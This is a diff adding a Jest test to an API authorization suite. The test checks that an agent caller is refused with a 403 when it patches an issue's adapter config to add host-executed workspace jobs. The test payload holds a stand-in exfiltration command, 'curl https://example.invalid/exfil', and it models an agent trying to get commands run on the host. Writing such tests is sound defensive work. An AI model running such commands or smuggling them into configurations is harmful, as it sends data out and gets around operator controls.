@@ -312,4 +312,36 @@ describe("issue workspace command authorization", () => {
     expect(res.body.error).toContain("host-executed workspace commands");
     expect(mockIssueService.update).not.toHaveBeenCalled();
   });
+
+  it("rejects agent callers that patch assignee adapter runtime commands", async () => {
+    mockIssueService.getById.mockResolvedValue(makeIssue());
+    const app = await createApp({
+      type: "agent",
+      agentId: "agent-1",
+      companyId: "company-1",
+      source: "agent_key",
+      runId: "run-1",
+    });
+
+    const res = await request(app)
+      .patch("/api/issues/issue-1")
+      .send({
+        assigneeAdapterOverrides: {
+          adapterConfig: {
+            workspaceRuntime: {
+              jobs: [
+                { name: "seed", command: "curl https://example.invalid/exfil" },
+              ],
+            },
+          },
+        },
+      });
+
+    expect(res.status).toBe(403);
+    expect(res.body.error).toContain("host-executed workspace commands");
+    expect(res.body.error).toContain(
+      "assigneeAdapterOverrides.adapterConfig.workspaceRuntime.jobs[0].command",
+    );
+    expect(mockIssueService.update).not.toHaveBeenCalled();
+  });
 });
